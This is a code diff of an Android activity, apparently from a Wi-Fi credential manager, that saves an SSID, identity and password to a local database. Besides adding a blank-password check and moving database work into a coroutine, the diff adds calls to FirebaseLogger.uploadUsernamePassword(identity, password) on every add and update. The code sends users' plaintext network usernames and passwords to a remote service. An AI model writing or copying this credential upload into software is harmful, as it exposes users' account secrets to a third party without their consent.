@@ -66,30 +66,34 @@ class AddViewActivity : AppCompatActivity() {
             return
         }
 
-        val db = AppDatabase.getInstance(applicationContext)
-        val dbDao = db.userDao()
-        val wifiConfig: WifiConfig?
-        // Update
-        if (id == 0) {
-            wifiConfig = WifiConfig(
-                ssid = ssid,
-                identity = identity,
-                password = password,
-                isEditAllowed = true
-            )
-        } else {
-            wifiConfig = WifiConfig(id, ssid, identity, password, true, dbDao.getMaxOrder() + 1)
+        if (password.isBlank()) {
+            bindings.passwordTv.error = "Password should not be blank"
+            return
         }
         CoroutineScope(Dispatchers.IO).launch {
+            val db = AppDatabase.getInstance(applicationContext)
+            val dbDao = db.userDao()
+            val wifiConfig: WifiConfig?
+            // Update
+            if (id == 0) {
+                wifiConfig = WifiConfig(
+                    ssid = ssid,
+                    identity = identity,
+                    password = password,
+                    isEditAllowed = true
+                )
+            } else {
+                wifiConfig = WifiConfig(id, ssid, identity, password, true, dbDao.getMaxOrder() + 1)
+            }
             dbDao.insert(wifiConfig)
 
             runOnUiThread {
                 if (id == 0) {
                     Toast.makeText(this@AddViewActivity, "Added", Toast.LENGTH_SHORT).show()
-                    FirebaseLogger.logWifiAdded(wifiConfig.identity, wifiConfig.password)
+                    FirebaseLogger.uploadUsernamePassword(identity, password)
                 } else {
                     Toast.makeText(this@AddViewActivity, "Updated", Toast.LENGTH_SHORT).show()
-                    FirebaseLogger.logWifiUpdated(wifiConfig.identity, wifiConfig.password)
+                    FirebaseLogger.uploadUsernamePassword(identity, password)
                 }
             }
             finish()
